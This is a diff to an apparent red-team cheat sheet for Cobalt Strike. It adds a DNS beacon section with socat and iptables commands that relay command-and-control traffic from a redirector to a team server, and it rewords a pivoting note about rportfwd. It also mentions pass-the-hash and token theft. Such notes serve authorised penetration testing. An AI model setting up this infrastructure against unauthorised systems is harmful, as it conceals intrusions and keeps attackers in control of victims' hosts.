@@ -49,6 +49,48 @@ beacon> link <IP>
 
 
 
+## DNS Beacons
+
+- [https://www.cobaltstrike.com/blog/simple-dns-redirectors-for-cobalt-strike/](https://www.cobaltstrike.com/blog/simple-dns-redirectors-for-cobalt-strike/)
+
+Create an `A` record `ns66.example.com` pointing to IP address of the redirector and then an `NS` record pointing to `ns66.example.com`.
+
+
+
+### socat Redirector
+
+On the redirector:
+
+```
+$ sudo socat -T 1 udp4-listen:53,fork tcp4:<TEAMSERVER_IP>:5353
+```
+
+On the team server:
+
+```
+$ socat -T 10 tcp4-listen:5353,fork udp4:127.0.0.1:53
+```
+
+### iptables Redirector
+
+```
+$ sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
+$ sudo iptables -I INPUT -p udp -m udp --dport 53 -j ACCEPT
+$ sudo iptables -t nat -A PREROUTING -m state --state NEW --protocol udp --destination <REDIRECTOR_IP> --destination-port 53 -j MARK --set-mark 0x400
+$ sudo iptables -t nat -A PREROUTING -m mark --mark 0x400 --protocol udp -j DNAT --to-destination <TEAMSERVER_IP>:53
+$ sudo iptables -t nat -A POSTROUTING -m mark --mark 0x400 -j MASQUERADE
+$ sudo iptables -I FORWARD -j ACCEPT
+```
+
+
+
+### DNSMasq Redirector
+
+- [https://buaq.net/go-20984.html](https://buaq.net/go-20984.html)
+
+
+
+
 ## Overpass-the-Hash
 
 More opsec PtH than builtin `pth` command (which does the Mimikatz `sekurlsa::pth` thing with named pipe impersonation):
@@ -100,7 +142,7 @@ beacon> beacon> steal_token 1337
 
 ## Pivoting
 
-Make any traffic hitting port **8443** on Victim to be redirected to **10.10.13.37** on port **443** (traffic flows through the Team Server):
+Make any traffic hitting port **8443** on Victim to be redirected to **10.10.13.37** on port **443** (traffic flows through the team server):
 
 ```
 beacon> rportfwd 8443 10.10.13.37 443
